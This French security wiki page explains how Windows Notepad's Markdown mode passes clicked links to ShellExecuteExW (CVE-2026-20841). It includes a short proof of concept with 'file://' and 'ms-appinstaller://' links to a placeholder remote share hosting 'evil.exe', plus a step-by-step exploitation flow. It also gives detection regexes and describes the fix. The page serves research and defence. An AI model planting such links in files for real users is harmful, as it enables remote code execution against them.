# Abus des gestionnaires de protocole Windows / ShellExecute (rendus Markdown)

{{#include ../banners/hacktricks-training.md}}

Les applications Windows qui affichent du Markdown ou du HTML peuvent transmettre les liens cliqués à `ShellExecuteExW`. Comme ShellExecute distribue les URI aux gestionnaires de protocoles enregistrés et les fichiers aux applications qui leur sont associées, un moteur de rendu doit utiliser une liste d’autorisations explicite au lieu de supposer que tous les liens sont HTTP(S). Le comportement de Notepad décrit ci-dessous concerne CVE-2026-20841 et ne doit pas être généralisé à tous les moteurs de rendu.<sup>[[1]](#references)[[3]](#references)</sup>

## Surface d’attaque de ShellExecuteExW en mode Markdown dans Windows Notepad
- Notepad sélectionne le mode Markdown **uniquement pour les extensions `.md`**, à l’aide d’une comparaison de chaînes fixe dans `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Liens Markdown pris en charge :
  - Standard : `[text](target)`
  - Lien automatique : `<target>` (affiché sous la forme `[target](target)`), les deux syntaxes comptent donc pour les payloads et leur détection.
- Les clics sur les liens sont traités dans `sub_140170F60()`, qui applique un filtrage faible, puis appelle `ShellExecuteExW`.
- `ShellExecuteExW` distribue les liens vers **n’importe quel gestionnaire de protocole configuré**, et pas seulement HTTP(S).<sup>[[1]](#references)</sup>

### Considérations sur les payloads
- Toute séquence `\\` dans le lien est **normalisée en `\`** avant l’appel à `ShellExecuteExW`, ce qui affecte la création et la détection des chemins UNC.
- Les fichiers `.md` **ne sont pas associés à Notepad par défaut** ; la victime doit tout de même ouvrir le fichier dans Notepad et cliquer sur le lien, mais une fois le document affiché, le lien est cliquable.
- Exemples de schémas dangereux :<sup>[[1]](#references)</sup>
  - `file://` pour lancer un payload local/UNC.
  - `ms-appinstaller://` pour déclencher les flux d’App Installer. D’autres schémas enregistrés localement peuvent également être exploités.

### PoC Markdown minimal
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Flux d’exploitation
1. Créer un **fichier `.md`** pour que Notepad l’affiche en Markdown.
2. Intégrer un lien utilisant un schéma URI dangereux (`file:`, `ms-appinstaller:` ou tout gestionnaire installé).
3. Distribuer le fichier (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ou similaire) et convaincre l’utilisateur de l’ouvrir dans Notepad.
4. Au clic, le **lien normalisé** est transmis à `ShellExecuteExW`, et le gestionnaire de protocole correspondant exécute le contenu référencé dans le contexte de l’utilisateur.<sup>[[1]](#references)[[2]](#references)</sup>

## Idées de détection
- Surveiller les transferts de fichiers `.md` via les ports/protocoles qui servent couramment à distribuer des documents : `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analyser les liens Markdown (standard et autolink) et rechercher `file:` ou `ms-appinstaller:` **sans tenir compte de la casse**.
- Expressions régulières recommandées par les éditeurs pour détecter l’accès à des ressources distantes :
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Le correctif du fournisseur décrit par ZDI limite les cibles acceptées aux fichiers locaux et aux URL HTTP(S). Étendez la détection à d’autres gestionnaires de protocoles installés, si nécessaire, car la surface d’attaque enregistrée varie selon le système.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841 : exécution de code arbitraire dans le Bloc-notes Windows](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC pour CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
